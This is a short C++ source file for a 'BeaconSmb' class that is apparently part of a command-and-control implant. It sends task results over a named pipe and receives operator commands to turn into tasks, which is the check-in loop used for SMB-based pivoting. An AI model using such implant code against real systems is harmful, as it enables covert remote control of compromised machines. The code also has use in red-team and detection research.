#include "BeaconSmb.hpp"

using namespace std;
using namespace PipeHandler;


BeaconSmb::BeaconSmb(std::string& ip, int port)
	: Beacon(ip, port)
{
	std::string pipeName = "mynamedpipe";
	m_clientSmb = new PipeHandler::Client(pipeName);
}


BeaconSmb::~BeaconSmb()
{
	delete m_clientSmb;
}


void BeaconSmb::checkIn()
{
	std::string output;
	taskResultsToCmd(output);

	m_clientSmb->sendData(output);

	string input;
	m_clientSmb->receiveData(input);

	if(!input.empty())
	{
		cmdToTasks(input);
	}
}

